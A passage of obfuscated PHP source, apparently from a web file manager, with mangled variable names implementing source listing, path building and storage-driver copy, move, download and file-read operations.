self::TYPE_USER) { if ($ÌáÅÊ‹µ[$°æ‰Ò[569]] == USER_ID) { $±¢øóŠ‹ = LNG($°æ‰Ò[597]); if ($Şİˆ±‚Ã === !1) { $½¯ÕòÆè = Model($°æ‰Ò[598])->getInfoFull(USER_ID); $Şİˆ±‚Ã = _get($½¯ÕòÆè, $°æ‰Ò[599], $°æ‰Ò[12]); } if ($—·Éëƒ• && $—·Éëƒ•[0] == $Şİˆ±‚Ã || !$—·Éëƒ• && $ÌáÅÊ‹µ[$°æ‰Ò[193]] == $Şİˆ±‚Ã) { $±¢øóŠ‹ = LNG($°æ‰Ò[600]); $ÌáÅÊ‹µ[$°æ‰Ò[601]] = $°æ‰Ò[602]; } if (!$—·Éëƒ•) { $ÌáÅÊ‹µ[$°æ‰Ò[32]] = $±¢øóŠ‹; } } else { $ÌáÅÊ‹µ[$°æ‰Ò[603]] = Model($°æ‰Ò[577])->getInfoSimpleOuter($ÌáÅÊ‹µ[$°æ‰Ò[569]]); $±¢øóŠ‹ = LNG($°æ‰Ò[604]) . $°æ‰Ò[176] . $ÌáÅÊ‹µ[$°æ‰Ò[603]][$°æ‰Ò[32]] . $°æ‰Ò[178]; } } else { if ($ÌáÅÊ‹µ[$°æ‰Ò[190]] == self::TYPE_GROUP) { $îœŞ•ª¿ = Model($°æ‰Ò[585])->getInfoSimple($ÌáÅÊ‹µ[$°æ‰Ò[569]]); $±¢øóŠ‹ = $îœŞ•ª¿[$°æ‰Ò[32]]; } else { if ($ÌáÅÊ‹µ[$°æ‰Ò[190]] == self::TYPE_SYSTEM) { $±¢øóŠ‹ = $°æ‰Ò[605]; } } } $±¢øóŠ‹ = $±¢øóŠ‹ ? $°æ‰Ò[8] . $±¢øóŠ‹ . $°æ‰Ò[8] : $°æ‰Ò[8]; return $±¢øóŠ‹; } protected function _listAppendUser(&$«¥„ÒÀ) { $†Ò£½ªú =& $_SERVER[Ş­ğŠìÒ]; $ğĞ·“ï¥ = array_to_keyvalue($«¥„ÒÀ, $†Ò£½ªú[12], $†Ò£½ªú[527]); $Ñ¬ äÜ² = array_to_keyvalue($«¥„ÒÀ, $†Ò£½ªú[12], $†Ò£½ªú[529]); $¿òŒê£° = array_merge($ğĞ·“ï¥, $Ñ¬ äÜ²); $¡§ß“´Ï = Model($†Ò£½ªú[598])->userListInfo($¿òŒê£°); foreach ($«¥„ÒÀ as &$õ ù¨Òä) { $¶õ´êÔò = $õ ù¨Òä[$†Ò£½ªú[527]]; $õ ù¨Òä[$†Ò£½ªú[527]] = $¡§ß“´Ï[$¶õ´êÔò] ? $¡§ß“´Ï[$¶õ´êÔò] : !1; $¶õ´êÔò = $õ ù¨Òä[$†Ò£½ªú[529]]; $õ ù¨Òä[$†Ò£½ªú[529]] = $¡§ß“´Ï[$¶õ´êÔò] ? $¡§ß“´Ï[$¶õ´êÔò] : !1; if (_get($õ ù¨Òä, $†Ò£½ªú[606], 0)) { $©¡°®¦ı = $GLOBALS[$†Ò£½ªú[6]][$†Ò£½ªú[92]][$†Ò£½ªú[607]]; if ($õ ù¨Òä[$†Ò£½ªú[539]][$†Ò£½ªú[608]] <= time() - $©¡°®¦ı) { $this->metaSet($õ ù¨Òä[$†Ò£½ªú[193]], $†Ò£½ªú[609], null); $this->metaSet($õ ù¨Òä[$†Ò£½ªú[193]], $†Ò£½ªú[608], null); unset($õ ù¨Òä[$†Ò£½ªú[539]][$†Ò£½ªú[609]]); continue; } $ã Î¦ü = $õ ù¨Òä[$†Ò£½ªú[539]][$†Ò£½ªú[609]]; $õ ù¨Òä[$†Ò£½ªú[539]][$†Ò£½ªú[610]] = Model($†Ò£½ªú[598])->getInfoSimpleOuter($ã Î¦ü); } } unset($õ ù¨Òä); } public function parentLevelArray($¿ÔÙÀˆ) { $° ĞîĞì =& $_SERVER[Ş­ğŠìÒ]; $¿ÔÙÀˆ = explode($° ĞîĞì[50], trim($¿ÔÙÀˆ, $° ĞîĞì[50])); return array_remove_value($¿ÔÙÀˆ, $° ĞîĞì[228]); } public function listAll($ë½‰¨¤ô) { $«”‹Ôãï =& $_SERVER[Ş­ğŠìÒ]; $Á³—Ö©Ã = $this->sourceInfo($ë½‰¨¤ô); $ÅØØ…ŒÊ = array($«”‹Ôãï[611] => array($«”‹Ôãï[612], $Á³—Ö©Ã[$«”‹Ôãï[584]] . $ë½‰¨¤ô . $«”‹Ôãï[613]), $«”‹Ôãï[614] => 0); $¶Ñ®¥Ø» = $«”‹Ôãï[615]; $ØÚÚ­‹ = "\x4c\105\x46\124\40\112\117\111\116\40{$this->tablePrefix}\151\157\137\x66\x69\x6c\145\40\146\151\x6c\x65\x20\157\156\x20\163\x6f\x75\x72\143\x65\x2e\146\151\154\145\111\x44\40\x3d\x20\146\x69\154\x65\56\146\x69\154\145\111\x44"; $ü‰İ¦Ê· = $this->alias($«”‹Ôãï[519])->field($¶Ñ®¥Ø»)->where($ÅØØ…ŒÊ)->join($ØÚÚ­‹)->select(); $this->_listAppendAuth($ü‰İ¦Ê·); $this->_listAppendUser($ü‰İ¦Ê·); $this->_listAppendPath($ü‰İ¦Ê·); $ü‰İ¦Ê· = array_to_keyvalue($ü‰İ¦Ê·, $«”‹Ôãï[193]); $ßµæƒÑ = "\x2f{$Á³—Ö©Ã[$«”‹Ôãï[32]]}\57"; $ßµæƒÑ = $ßµæƒÑ == $«”‹Ôãï[592] ? $«”‹Ôãï[8] : $ßµæƒÑ; $ì°Ù´øã = array(); foreach ($ü‰İ¦Ê· as $¤ï¼Åò => $¢ï½øïÑ) { $Éš¯Øš‚ = $this->parentLevelArray($¢ï½øïÑ[$«”‹Ôãï[584]]); array_shift($Éš¯Øš‚); $Áé›Ôò¡ = $ßµæƒÑ; for ($´±ÛŸ¶ = 0; $´±ÛŸ¶ < count($Éš¯Øš‚); $´±ÛŸ¶++) { $Áé›Ôò¡ .= $ü‰İ¦Ê·[$Éš¯Øš‚[$´±ÛŸ¶]][$«”‹Ôãï[32]] . $«”‹Ôãï[8]; } $Áé›Ôò¡ .= $¢ï½øïÑ[$«”‹Ôãï[32]]; if ($¢ï½øïÑ[$«”‹Ôãï[485]]) { $Áé›Ôò¡ .= $«”‹Ôãï[8]; } $„ü¢”ë = array($«”‹Ôãï[495] => str_replace($«”‹Ôãï[592], $«”‹Ôãï[8], str_replace($«”‹Ôãï[592], $«”‹Ôãï[8], str_replace($«”‹Ôãï[592], $«”‹Ôãï[8], $Áé›Ôò¡))), $«”‹Ôãï[616] => intval($¢ï½øïÑ[$«”‹Ôãï[485]]), $«”‹Ôãï[617] => intval($¢ï½øïÑ[$«”‹Ôãï[79]]), $«”‹Ôãï[88] => intval($¢ï½øïÑ[$«”‹Ôãï[88]]), $«”‹Ôãï[90] => $this->pathInfoFilter($¢ï½øïÑ)); if (!$„ü¢”ë[$«”‹Ôãï[485]]) { $„ü¢”ë[$«”‹Ôãï[541]] = $¢ï½øïÑ[$«”‹Ôãï[541]]; } $ì°Ù´øã[] = $„ü¢”ë; } $ì°Ù´øã = array_sort_by($ì°Ù´øã, $«”‹Ôãï[87]); return $ì°Ù´øã; } } goto EøÛù…Á„; bÎÂ†·É·: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÄÎ²óí‘, $Û¨·­¥) { $Üâ‘éŠœ =& $_SERVER[Ş­ğŠìÒ]; $ ªÄ°˜ = $Û¨·­¥; $GLOBALS[$Üâ‘éŠœ[1223]] = $Üâ‘éŠœ[1224] . $ÄÎ²óí‘; Hook::trigger($Üâ‘éŠœ[1224] . $ÄÎ²óí‘ . $Üâ‘éŠœ[1225], $ ªÄ°˜); $µÙù•åÅ = self::driverMake($Û¨·­¥[0]); if (!$µÙù•åÅ) { return !1; } if (method_exists($µÙù•åÅ, $ÄÎ²óí‘)) { $¶©Å¢¾ = @call_user_func_array(array($µÙù•åÅ, $ÄÎ²óí‘), $Û¨·­¥); } else { if (method_exists($µÙù•åÅ, $Üâ‘éŠœ[1226])) { $¶©Å¢¾ = @call_user_func_array(array($µÙù•åÅ, $ÄÎ²óí‘), $Û¨·­¥); } else { if (method_exists(self, $ÄÎ²óí‘)) { $¶©Å¢¾ = @call_user_func_array(array(self, $ÄÎ²óí‘), $Û¨·­¥); } else { $¶©Å¢¾ = call_user_func_array(array(parent, $ÄÎ²óí‘), $Û¨·­¥); } } } Hook::trigger($Üâ‘éŠœ[1224] . $ÄÎ²óí‘ . $Üâ‘éŠœ[1227], $ ªÄ°˜, $¶©Å¢¾); return $¶©Å¢¾; } public static function init($¸ü¨¿İô) { return self::driverMake($¸ü¨¿İô); } public static function copy($±‰Î×ªÜ, $ôøùÓÃ„, $ä…Ï˜ğ = false, $Ÿä°„ì£ = false) { return self::copyMoveStart($±‰Î×ªÜ, $ôøùÓÃ„, $ä…Ï˜ğ, $_SERVER[Ş­ğŠìÒ][618], $Ÿä°„ì£); } public static function move($öåÊ–©µ, $€áØ’, $Øàíñçã = false, $¹À¹´‘Š = false) { return self::copyMoveStart($öåÊ–©µ, $€áØ’, $Øàíñçã, $_SERVER[Ş­ğŠìÒ][620], $¹À¹´‘Š); } private static function copyMoveStart($‘ÔİØØ, $Ú‰üÁÑ, $şåêƒˆó, $ª¡Àº˜¥, $öŒ’Ğ½ñ) { $ú©¸’€ =& $_SERVER[Ş­ğŠìÒ]; $°âÎöÛÁ = array($‘ÔİØØ, $Ú‰üÁÑ, $şåêƒˆó, $öŒ’Ğ½ñ); Hook::trigger($ú©¸’€[1224] . $ª¡Àº˜¥ . $ú©¸’€[1225], $°âÎöÛÁ); $Œ¸Éå« = self::copyMove($‘ÔİØØ, $Ú‰üÁÑ, $şåêƒˆó, $ª¡Àº˜¥, $öŒ’Ğ½ñ); Hook::trigger($ú©¸’€[1224] . $ª¡Àº˜¥ . $ú©¸’€[1227], $°âÎöÛÁ, $Œ¸Éå«); return $Œ¸Éå«; } public static function saveFile($œ¿¢úâœ, $®’‚¶©Ô, $‰‘í§Ş™ = true) { $ˆ•Èî³Ù =& $_SERVER[Ş­ğŠìÒ]; $•ª•²Ãê = self::info($®’‚¶©Ô); $›ˆ—æ“ = self::driverMake($œ¿¢úâœ); $ñ·ÄÚÙÙ = self::driverMake($®’‚¶©Ô); $¯‰É‡‚ä = !1; if ($ñ·ÄÚÙÙ->pathParse[$ˆ•Èî³Ù[1228]]) { $¯‰É‡‚ä = $ñ·ÄÚÙÙ; $œĞ¥Ã„ô = $ñ·ÄÚÙÙ->pathParse[$ˆ•Èî³Ù[1228]]; $ñ·ÄÚÙÙ = self::driverMake($œĞ¥Ã„ô); } if ($›ˆ—æ“->pathParse[$ˆ•Èî³Ù[1228]]) { $¢‚İ’Áñ = $›ˆ—æ“->pathParse[$ˆ•Èî³Ù[1228]]; $›ˆ—æ“ = self::driverMake($¢‚İ’Áñ); } $ù«õ•¬ò = $ñ·ÄÚÙÙ->pathFather($®’‚¶©Ô); $¤Àë÷ó = !0; if (!$‰‘í§Ş™ && self::driverIsSame($›ˆ—æ“, $ñ·ÄÚÙÙ)) { $¤Àë÷ó = !1; } $ÈÀ¡êÈÈ = self::copyFile($›ˆ—æ“, $œ¿¢úâœ, $ñ·ÄÚÙÙ, $ù«õ•¬ò, $•ª•²Ãê[$ˆ•Èî³Ù[32]], $¤Àë÷ó); if ($¯‰É‡‚ä) { $ÈÀ¡êÈÈ = $¯‰É‡‚ä->getPathOuter($ÈÀ¡êÈÈ); } return $ÈÀ¡êÈÈ; } private static function copyMove($ƒ¢½Èı©, $‰ïµ¤“›, $î”»×ˆÅ, $àã»ì¿­, $«®‹ººÀ = false) { $Õû ‘Ã =& $_SERVER[Ş­ğŠìÒ]; if (!$ƒ¢½Èı© || $ƒ¢½Èı© == $Õû ‘Ã[8] || !$‰ïµ¤“›) { return !1; } ignore_timeout(); $ºú  à÷ = self::driverMake($ƒ¢½Èı©); $Üè¸®Ô« = self::driverMake($‰ïµ¤“›); $æ÷œµ²Ì = $àã»ì¿­ == $Õû ‘Ã[620]; $Ş—üà¥¾ = !1; if ($Üè¸®Ô«->pathParse[$Õû ‘Ã[1228]]) { $Ş—üà¥¾ = $Üè¸®Ô«; $‰ïµ¤“› = $Üè¸®Ô«->pathParse[$Õû ‘Ã[1228]]; $Üè¸®Ô« = self::driverMake($‰ïµ¤“›); } if ($ºú  à÷->pathParse[$Õû ‘Ã[1228]]) { $ƒ¢½Èı© = $ºú  à÷->pathParse[$Õû ‘Ã[1228]]; $ºú  à÷ = self::driverMake($ƒ¢½Èı©); } self::check($ºú  à÷, $ƒ¢½Èı©, $Üè¸®Ô«, $‰ïµ¤“›); Hook::trigger($Õû ‘Ã[1229], $ºú  à÷, $ƒ¢½Èı©, $Üè¸®Ô«, $‰ïµ¤“›); $¬Ò­ƒ“ = self::driverIsSame($ºú  à÷, $Üè¸®Ô«); if ($¬Ò­ƒ“) { if ($àã»ì¿­ == $Õû ‘Ã[620] && !method_exists($Üè¸®Ô«, $Õû ‘Ã[1230]) && trim($‰ïµ¤“›, $Õû ‘Ã[8]) == trim($Üè¸®Ô«->pathFather($ƒ¢½Èı©), $Õû ‘Ã[8])) { if ($ºú  à÷->pathThis($ƒ¢½Èı©) != $«®‹ººÀ && !$ºú  à÷->isOsDriver()) { return $ºú  à÷->rename($ƒ¢½Èı©, $«®‹ººÀ); } return $Üè¸®Ô«->getPathOuter($ƒ¢½Èı©); } if (method_exists($Üè¸®Ô«, $àã»ì¿­)) { return $Üè¸®Ô«->{$àã»ì¿­}($ƒ¢½Èı©, $‰ïµ¤“›, $î”»×ˆÅ, $«®‹ººÀ); } } if ($¬Ò­ƒ“ && $àã»ì¿­ == $Õû ‘Ã[620] && $Üè¸®Ô«->getType() == $Õû ‘Ã[109]) { $ó–õÓø‚ = $Üè¸®Ô«->movePath($ƒ¢½Èı©, $‰ïµ¤“›, $«®‹ººÀ); if ($ó–õÓø‚) { return $ó–õÓø‚; } } $çèß‹îş = $ºú  à÷->isFile($ƒ¢½Èı©); if (!$çèß‹îş && $Üè¸®Ô«->getType() == $Õû ‘Ã[824] && $ºú  à÷->getType() == $Õû ‘Ã[109]) { $ó–õÓø‚ = $Üè¸®Ô«->copyFolderFromIO($ºú  à÷, $ƒ¢½Èı©, $‰ïµ¤“›, $î”»×ˆÅ, $æ÷œµ²Ì, $«®‹ººÀ); } else { $ó–õÓø‚ = self::copyPath($ºú  à÷, $ƒ¢½Èı©, $Üè¸®Ô«, $‰ïµ¤“›, $î”»×ˆÅ, $æ÷œµ²Ì, $çèß‹îş, $«®‹ººÀ); } if ($ó–õÓø‚ && $æ÷œµ²Ì) { $ºú  à÷->remove($ƒ¢½Èı©); } if ($Ş—üà¥¾) { $ó–õÓø‚ = $Ş—üà¥¾->getPathOuter($ó–õÓø‚); } return $ó–õÓø‚; } private static function check($İ§Êî˜, $¢´İïíÂ, $£¦˜É¤, &$¶ùÀÀİ) { $©ù¤ÀÛ =& $_SERVER[Ş­ğŠìÒ]; if (self::driverIsSame($İ§Êî˜, $£¦˜É¤) && $İ§Êî˜->isFolder($¢´İïíÂ) && $İ§Êî˜->isParentOf($¢´İïíÂ, $¶ùÀÀİ)) { show_json(LNG($©ù¤ÀÛ[1231]), !1); } if (!$İ§Êî˜->exist($¢´İïíÂ)) { show_json(LNG($©ù¤ÀÛ[108]), !1); } } private static function copyPath($ø°°¼İæ, $•ÚëˆÍ, $Ü÷Ââ¦£, $Ç½Ö™«², $ÜªÂ¨Óó, $Ú²š²Ë, $Á†şÇ¯Â, $…ËÊ®· = false, $ùÉ˜•½ = true) { $ö¦§ëûÒ =& $_SERVER[Ş­ğŠìÒ]; $Øü¨ºñ = empty($…ËÊ®·) && $…ËÊ®· !== $ö¦§ëûÒ[228] ? $ø°°¼İæ->pathThis($•ÚëˆÍ) : $…ËÊ®·; if ($ÜªÂ¨Óó) { $­÷¬şè = $Ü÷Ââ¦£->fileNameExist($Ç½Ö™«², $Øü¨ºñ); $Ñ´ÇÊ›¢ = $Øü¨ºñ; $Øü¨ºñ = $Ü÷Ââ¦£->fileNameAuto($Ç½Ö™«², $Øü¨ºñ, $ÜªÂ¨Óó, !$Á†şÇ¯Â); if (!$­÷¬şè || $Ñ´ÇÊ›¢ != $Øü¨ºñ) { $ÜªÂ¨Óó = !1; } if ($ùÉ˜•½ && !$ÜªÂ¨Óó) { $Ü÷Ââ¦£->_data[$ö¦§ëûÒ[1232]] = !0; } } if ($Á†şÇ¯Â) { return self::copyFile($ø°°¼İæ, $•ÚëˆÍ, $Ü÷Ââ¦£, $Ç½Ö™«², $Øü¨ºñ, $Ú²š²Ë); } if ($ÜªÂ¨Óó == REPEAT_RENAME_FOLDER) { $ÜªÂ¨Óó = !1; } $èÍ“¡ñ½ = rtrim($Ç½Ö™«², $ö¦§ëûÒ[8]) . $ö¦§ëûÒ[8] . $Øü¨ºñ; $ŸŸøùÕ€ = $Ü÷Ââ¦£->mkdir($Ü÷Ââ¦£->getPath($èÍ“¡ñ½), $ÜªÂ¨Óó); $Ç½Ö™«² = $Ü÷Ââ¦£->getPathInner($ŸŸøùÕ€); $¸ÀêÓå = $ø°°¼İæ->listPath($•ÚëˆÍ, !0); $¸ÀêÓå = is_array($¸ÀêÓå) ? $¸ÀêÓå : array($ö¦§ëûÒ[86] => array(), $ö¦§ëûÒ[85] => array()); $øÃ€‚ Ç = array_merge($¸ÀêÓå[$ö¦§ëûÒ[86]], $¸ÀêÓå[$ö¦§ëûÒ[85]]); foreach ($øÃ€‚ Ç as $ü—Ï¥İ) { $İƒÎÒ = $ü—Ï¥İ[$ö¦§ëûÒ[33]] == $ö¦§ëûÒ[230]; $•ÚëˆÍ = $ø°°¼İæ->getPathInner($ü—Ï¥İ[$ö¦§ëûÒ[87]]); $ÚÓäãçï = self::copyPath($ø°°¼İæ, $•ÚëˆÍ, $Ü÷Ââ¦£, $Ç½Ö™«², $ÜªÂ¨Óó, $Ú²š²Ë, $İƒÎÒ, !1, !1); if (!$ÚÓäãçï) { IO::errorTips($ö¦§ëûÒ[1233] . $•ÚëˆÍ . $ö¦§ëûÒ[73] . $Ç½Ö™«²); } } self::copyMoveKeepInfo($ø°°¼İæ, $•ÚëˆÍ, $ŸŸøùÕ€); return $ŸŸøùÕ€; } private static function copyFile($£¡®Ã‰İ, $ú­âÕ·’, $ĞÑÍçñ´, $ı‰æõÒ¸, $ØÊĞ¢£œ, $ìà°´ÏÉ) { $¹€”î Ë =& $_SERVER[Ş­ğŠìÒ]; $ı‰æõÒ¸ = $ĞÑÍçñ´->getPath(rtrim($ı‰æõÒ¸, $¹€”î Ë[8]) . $¹€”î Ë[8] . $ØÊĞ¢£œ); $ê“¤Óæƒ = $¹€”î Ë[1234] . time() . rand_string(5); Hook::trigger($¹€”î Ë[1235], $£¡®Ã‰İ, $ú­âÕ·’, $ĞÑÍçñ´, $ı‰æõÒ¸, $ØÊĞ¢£œ, $ê“¤Óæƒ); if (self::driverIsSame($£¡®Ã‰İ, $ĞÑÍçñ´)) { if ($ìà°´ÏÉ) { $àË—ÙúÛ = $ĞÑÍçñ´->moveFile($ú­âÕ·’, $ı‰æõÒ¸); } else { $àË—ÙúÛ = $ĞÑÍçñ´->copyFile($ú­âÕ·’, $ı‰æõÒ¸); } Hook::trigger($¹€”î Ë[1236], $£¡®Ã‰İ, $ú­âÕ·’, $ĞÑÍçñ´, $ı‰æõÒ¸, $ØÊĞ¢£œ, $àË—ÙúÛ); self::copyMoveKeepInfo($£¡®Ã‰İ, $ú­âÕ·’, $àË—ÙúÛ); return $àË—ÙúÛ; } $éŞëÕÉ¢ = TEMP_FILES; if ($GLOBALS[$¹€”î Ë[6]][$¹€”î Ë[92]][$¹€”î Ë[863]]) { $éŞëÕÉ¢ = $GLOBALS[$¹€”î Ë[6]][$¹€”î Ë[92]][$¹€”î Ë[863]]; } $·ï¾¤ûë = $éŞëÕÉ¢; mk_dir($·ï¾¤ûë); $Üç¿˜Ã = $·ï¾¤ûë . $ê“¤Óæƒ; $¨·ƒ‰íÒ = $Üç¿˜Ã; $Üç¿˜Ã = $£¡®Ã‰İ->download($ú­âÕ·’, $Üç¿˜Ã); $Üç¿˜Ã = $£¡®Ã‰İ->iconvApp($Üç¿˜Ã); if (substr($Üç¿˜Ã, strlen($éŞëÕÉ¢)) == $éŞëÕÉ¢) { $ìà°´ÏÉ = !0; } $àË—ÙúÛ = $ĞÑÍçñ´->upload($ı‰æõÒ¸, $Üç¿˜Ã, $ìà°´ÏÉ); self::remove($¨·ƒ‰íÒ); Hook::trigger($¹€”î Ë[1236], $£¡®Ã‰İ, $ú­âÕ·’, $ĞÑÍçñ´, $ı‰æõÒ¸, $ØÊĞ¢£œ, $àË—ÙúÛ); self::copyMoveKeepInfo($£¡®Ã‰İ, $ú­âÕ·’, $àË—ÙúÛ); return $àË—ÙúÛ; } private static function copyMoveKeepInfo($Á¬ß¡‰‡, $ªÈ•Ş¬†, $À‚À·ß) { if (!$À‚À·ß) { return; } $®Úüºî‚ = $Á¬ß¡‰‡->info($ªÈ•Ş¬†); if (!is_array($®Úüºî‚)) { return; } IO::setModifyTime($À‚À·ß, $®Úüºî‚[$_SERVER[Ş­ğŠìÒ][88]]); } public static function pathFather($üÊ‰å×£) { $±ˆÚ¦İ = IO::init($üÊ‰å×£); $Èˆ…†ˆ = $±ˆÚ¦İ->pathFather($±ˆÚ¦İ->path); return $±ˆÚ¦İ->getPathOuter($Èˆ…†ˆ); } public static function fileOut($ªÚÛ ¶, $Ë‹ã¡è = false, $Ø£Ãî¢ö = false, $›À‘• = '') { $íá¶ÔĞğ = self::driverMake($ªÚÛ ¶); if ($íá¶ÔĞğ->isFileOutServer()) { return $íá¶ÔĞğ->fileOutServer($ªÚÛ ¶, $Ë‹ã¡è, $Ø£Ãî¢ö, $›À‘•); } return $íá¶ÔĞğ->fileOut($ªÚÛ ¶, $Ë‹ã¡è, $Ø£Ãî¢ö, $›À‘•); } public static function fileOutImage($ˆˆªù°, $ö¯ú…Ş¢ = 250) { $İ£™ ñÊ = array(250, 600, 1200, 2000, 3000, 5000); for ($Ğæ¡¸ˆ = 0; $Ğæ¡¸ˆ < count($İ£™ ñÊ); $Ğæ¡¸ˆ++) { if ($Ğæ¡¸ˆ == 0 && $ö¯ú…Ş¢ <= $İ£™ ñÊ[$Ğæ¡¸ˆ]) { $ö¯ú…Ş¢ = $İ£™ ñÊ[$Ğæ¡¸ˆ]; break; } else { if ($ö¯ú…Ş¢ > $İ£™ ñÊ[$Ğæ¡¸ˆ - 1] && $ö¯ú…Ş¢ <= $İ£™ ñÊ[$Ğæ¡¸ˆ]) { $ö¯ú…Ş¢ = $İ£™ ñÊ[$Ğæ¡¸ˆ]; break; } else { if ($Ğæ¡¸ˆ == count($İ£™ ñÊ) - 1 && $ö¯ú…Ş¢ > $İ£™ ñÊ[$Ğæ¡¸ˆ]) { $ö¯ú…Ş¢ = $İ£™ ñÊ[$Ğæ¡¸ˆ]; break; } } } } $Üß“ôœë = self::driverMake($ˆˆªù°); if ($Üß“ôœë->isFileOutServer()) { return $Üß“ôœë->fileOutImageServer($ˆˆªù°, $ö¯ú…Ş¢); } return $Üß“ôœë->fileOutImage($ˆˆªù°, $ö¯ú…Ş¢); } private static function driverIsSame($ Êˆö¤Å, $ÏÁşë§ô) { $ÒÍ€Éô =& $_SERVER[Ş­ğŠìÒ]; $Îµ×ÆÚì = $ Êˆö¤Å->getType(); $â°µ½ä = $ÏÁşë§ô->getType(); if ($Îµ×ÆÚì != $â°µ½ä) { return !1; } if ($Îµ×ÆÚì == $ÒÍ€Éô[824]) { return !0; } if ($Îµ×ÆÚì == $ÒÍ€Éô[109]) { return !0; } if ($ Êˆö¤Å->pathDriver == $ÏÁşë§ô->pathDriver) { return !0; } return !1; } public static function copyUpdate($‰»¥«, $Œ‘î¡õÍ) { $÷Şí“½’ =& $_SERVER[Ş­ğŠìÒ]; if (!IO::exist($‰»¥«)) { return !1; } if (!IO::exist($Œ‘î¡õÍ)) { IO::mkdir($Œ‘î¡õÍ); } $š£…¿¥— = array_to_keyvalue(self::listAllSimple($‰»¥«), $÷Şí“½’[87]); $Õ–µá¢¿ = array_to_keyvalue(self::listAllSimple($Œ‘î¡õÍ), $÷Şí“½’[87]); $†À‚Šşœ = array(); $ª¸ïÉ¼ş = array(); foreach ($š£…¿¥— as $­é¶ÂÈû => $ƒ‰½Íƒà) { if (isset($Õ–µá¢¿[$­é¶ÂÈû])) { if ($ƒ‰½Íƒà[$÷Şí“½’[78]] == 1) { continue; } if ($Õ–µá¢¿[$­é¶ÂÈû][$÷Şí“½’[79]] == $ƒ‰½Íƒà[$÷Şí“½’[79]]) { continue; } } if ($ƒ‰½Íƒà[$÷Şí“½’[78]] == 1) { $ª¸ïÉ¼ş[] = $Œ‘î¡õÍ . $÷Şí“½’[8] . trim($­é¶ÂÈû, $÷Şí“½’[8]); continue; } $“å›¥ØÖ = strstr(trim($­é¶ÂÈû, $÷Şí“½’[8]), $÷Şí“½’[8]) ? get_path_father($­é¶ÂÈû) : $÷Şí“½’[12]; $†À‚Šşœ[] = array($÷Şí“½’[1237] => $ƒ‰½Íƒà[$÷Şí“½’[89]], $÷Şí“½’[1238] => rtrim($Œ‘î¡õÍ, $÷Şí“½’[8]) . $÷Şí“½’[8] . $“å›¥ØÖ, $÷Şí“½’[1239] => $ƒ‰½Íƒà); } $¹×ùÌÁ = array($÷Şí“½’[230] => $†À‚Šşœ, $÷Şí“½’[78] => $ª¸ïÉ¼ş); Hook::trigger($÷Şí“½’[1240], $‰»¥«, $Œ‘î¡õÍ, $¹×ùÌÁ); foreach ($ª¸ïÉ¼ş as $ƒ‰½Íƒà) { IO::mkdir($ƒ‰½Íƒà); } foreach ($†À‚Šşœ as $ƒ‰½Íƒà) { IO::copy($ƒ‰½Íƒà[$÷Şí“½’[1237]], $ƒ‰½Íƒà[$÷Şí“½’[1238]], REPEAT_REPLACE); } } public static function fileSubstr($ÖíŒñ×°, $ÈÍó·¶, $±Éõ® = false) { $»ÃŒ×àÁ =& $_SERVER[Ş­ğŠìÒ]; $½ù¹óùş = self::driverMake($ÖíŒñ×°); $Ì«§¯ù‹ = $½ù¹óùş->size($ÖíŒñ×°); $ôœ©Œö¾ = $ÈÍó·¶; $È£¹šÉ­ = $±Éõ®; if ($ÈÍó·¶ < 0) { $ÈÍó·¶ = $Ì«§¯ù‹ + $ÈÍó·¶; } if ($±Éõ® === !1) { $±Éõ® = $Ì«§¯ù‹ - $ÈÍó·¶; } if ($ÈÍó·¶ + $±Éõ® > $Ì«§¯ù‹) { $±Éõ® = $Ì«§¯ù‹ - $ÈÍó·¶; } if (!$Ì«§¯ù‹ && $½ù¹óùş->getType() == $»ÃŒ×àÁ[109] && !$½ù¹óùş->exist($ÖíŒñ×°)) { $®â™“ôŒ = get_path_this($ÖíŒñ×°); $ê˜åµíé = parse_url_query($®â™“ôŒ); if (is_array($ê˜åµíé) && isset($ê˜åµíé[$»ÃŒ×àÁ[32]])) { $®â™“ôŒ = urldecode($ê˜åµíé[$»ÃŒ×àÁ[32]]); } throw new Exception($»ÃŒ×àÁ[1241] . LNG($»ÃŒ×àÁ[1242]) . $»ÃŒ×àÁ[1040] . clear_html($®â™“ôŒ) . $»ÃŒ×àÁ[12]); } if ($±Éõ® <= 0) { return $»ÃŒ×àÁ[12]; } if ($ÈÍó·¶ < 0 || $ÈÍó·¶ >= $Ì«§¯ù‹ || $±Éõ® > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\x52\145\x61\144\x20\145\x72\x72\157\x72\41\40\163\x74\x61\x72\x74\75{$ÈÍó·¶}\73\x6c\x65\x6e\147\164\x68\x3d{$±Éõ®}\73\40\x73\x69\x7a\x65\75{$Ì«§¯ù‹}\73"); } $Óë¦´ïû = $½ù¹óùş->fileSubstr($ÖíŒñ×°, $ÈÍó·¶, $±Éõ®); if (!$Óë¦´ïû && $±Éõ® && isset($GLOBALS[$»ÃŒ×àÁ[1243]])) { throw new Exception($GLOBALS[$»ÃŒ×àÁ[1243]][$»ÃŒ×àÁ[1244]]); } return $Óë¦´ïû; } private static function driverMake(&$Øª¶‹ûû) { $ìÀĞÏ¹ú =& $_SERVER[Ş­ğŠìÒ]; $Û§ØÓÜ = KodIO::parse($Øª¶‹ûû); if (!self::$driverListSystem) { $‰ûñáş = Model($ìÀĞÏ¹ú[834])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‰ûñáş, $ìÀĞÏ¹ú[475]); } if ($Û§ØÓÜ[$ìÀĞÏ¹ú[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Û§ØÓÜ[$ìÀĞÏ¹ú[475]]]) { throw new Exception($ìÀĞÏ¹ú[1245]); return !1; } $Øª¶‹ûû = $Û§ØÓÜ[$ìÀĞÏ¹ú[1246]]; $¼èˆßŠ¦ = self::driverGet($Û§ØÓÜ, $Øª¶‹ûû); return $¼èˆßŠ¦; } private static function driverGet($ˆ¸íßÏ‘, &$Îš¤ªÀí) { $˜¨¦Ï¡Û =& $_SERVER[Ş­ğŠìÒ]; $ğïßßä  = $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[1247]]; $‰íàÖ™¹ = $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[475]]; switch ($ˆ¸íßÏ‘[$˜¨¦Ï¡Û[33]]) { case KodIO::KOD_IO: $÷ç¶ÒÚÚ = self::$driverListSystem[$‰íàÖ™¹]; break; case KodIO::KOD_SOURCE: $Îš¤ªÀí = $‰íàÖ™¹ . $Îš¤ªÀí; $÷ç¶ÒÚÚ = array($˜¨¦Ï¡Û[1248] => $˜¨¦Ï¡Û[1249], $˜¨¦Ï¡Û[6] => 